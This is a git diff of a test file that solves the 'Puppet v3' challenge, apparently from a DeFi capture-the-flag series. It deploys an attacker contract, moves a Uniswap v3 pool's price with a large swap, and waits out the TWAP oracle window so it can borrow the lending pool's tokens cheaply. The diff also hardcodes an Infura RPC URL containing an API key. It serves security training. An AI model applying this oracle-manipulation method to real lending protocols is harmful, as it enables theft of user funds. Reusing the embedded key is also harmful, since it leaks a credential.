@@ -26,7 +26,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://mainnet.infura.io/v3/8df75ffc9bba40ae9933bec919baf187";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -140,6 +140,142 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        //WETH-token0="0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
+        //DVT-token1="0xdF46e54aAadC1d55198A4a8b4674D7a4c927097A"
+        //Swap DVT for ETH - OneForZero
+        /**Step1: Deployment */
+        const PuppetV3Attacker = await ethers.getContractFactory("PV3Attacker");
+        const puppetV3Attacker = await PuppetV3Attacker.deploy(
+            token.address,
+            uniswapPool.address,
+            lendingPool.address,
+            weth.address
+        );
+        console.log("puppetV3Attacker is deployed at", puppetV3Attacker.address);
+        await token
+            .connect(player)
+            .transfer(puppetV3Attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        console.log(
+            "puppetV3Attacker token balance is",
+            ethers.utils.formatEther(
+                (await token.balanceOf(puppetV3Attacker.address)).toString()
+            ),
+            "\n____________________________________________________",
+            "\nZero for One: false - Swapping token for Weth...",
+            "\n____________________________________________________"
+        );
+        /** Step2: swapping with time increments */
+
+        console.log(
+            "current liquidity before swap",
+            (await uniswapPool.liquidity()).toString()
+        );
+        console.log(
+            "current slot0 sqrtpricex96 before swap",
+            (await uniswapPool.slot0())[0].toString()
+        );
+        console.log(
+            "current slot0 tick before swap",
+            (await uniswapPool.slot0())[1].toString()
+        );
+
+        await puppetV3Attacker.callSwap(ethers.utils.parseEther("109"), {
+            gasLimit: 3000000,
+        });
+        console.log(
+            "Attacker Weth Balance after swap",
+            ethers.utils.formatEther(
+                (await weth.balanceOf(puppetV3Attacker.address)).toString()
+            )
+        );
+        console.log(
+            "Attacker Token Balance after swap",
+            ethers.utils.formatEther(
+                (await token.balanceOf(puppetV3Attacker.address)).toString()
+            )
+        );
+        console.log("Current block number", await ethers.provider.getBlockNumber());
+        console.log(
+            "Quote after swap1",
+            ethers.utils.formatEther(
+                await lendingPool.calculateDepositOfWETHRequired(
+                LENDING_POOL_INITIAL_TOKEN_BALANCE
+                )
+            ),
+            "ether",
+            "\n____________________________________________________"
+        );
+
+        await time.increase(100);
+        console.log("Current block number", await ethers.provider.getBlockNumber());
+        console.log(
+            "Quote after 100s",
+            ethers.utils.formatEther(
+                await lendingPool.calculateDepositOfWETHRequired(
+                LENDING_POOL_INITIAL_TOKEN_BALANCE
+                )
+            ),
+            "ether"
+        );
+
+        console.log("current liquidity ", await uniswapPool.liquidity().toString());
+        console.log("current slot0 ", (await uniswapPool.slot0())[0].toString());
+        console.log(
+            "current slot0 tick ",
+            (await uniswapPool.slot0())[1].toString()
+        );
+
+        /**Step 3: Transfer Weth from attacker contract to player and borrow from pool */
+        await puppetV3Attacker.connect(player).transferWeth();
+
+        await weth
+            .connect(player)
+            .approve(lendingPool.address, ethers.utils.parseEther("99"));
+
+        await lendingPool
+            .connect(player)
+            .borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        console.log(
+            `Seconds lapsed since execution starts`,
+            (await ethers.provider.getBlock("latest")).timestamp -
+                initialBlockTimestamp
+        );
+        console.log(
+            `current timestamp`,
+            (await ethers.provider.getBlock("latest")).timestamp
+        );
+
+        // Check the pool status for references
+        await puppetV3Attacker.observePool([600, 0]);
+        console.log(
+            "tickCumulatives at 10min ago",
+            (await puppetV3Attacker.tickCumulatives(0)).toString()
+        );
+        console.log(
+            "tickCumulatives now",
+            (await puppetV3Attacker.tickCumulatives(1)).toString()
+        );
+
+        console.log(
+            "Weth balance in UniswapPool",
+            ethers.utils.formatEther(
+                (await weth.balanceOf(uniswapPool.address)).toString()
+            )
+        );
+        console.log(
+            "Token balance in UniswapPool",
+            ethers.utils.formatEther(
+                (await token.balanceOf(uniswapPool.address)).toString()
+            )
+        );
+        //For reference: calculate spot price based on ratio of token balances
+        let x = await weth.balanceOf(uniswapPool.address);
+        let y = await token.balanceOf(uniswapPool.address);
+        console.log(
+            "Ref: Quote of 1million token from lending pool in Weth (based on ratio of token balances):",
+            (x * 1000000 * 3) / y
+        );
     });
 
     after(async function () {
@@ -157,5 +293,17 @@ describe('[Challenge] Puppet v3', function () {
         expect(
             await token.balanceOf(player.address)
         ).to.be.gte(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        console.log(
+            "Token balance in UniswapPool",
+            ethers.utils.formatEther(
+                (await token.balanceOf(uniswapPool.address)).toString()
+            )
+        );
+        console.log(
+            "WETH balance in UniswapPool",
+            ethers.utils.formatEther(
+                (await weth.balanceOf(uniswapPool.address)).toString()
+            )
+        );
     });
 });
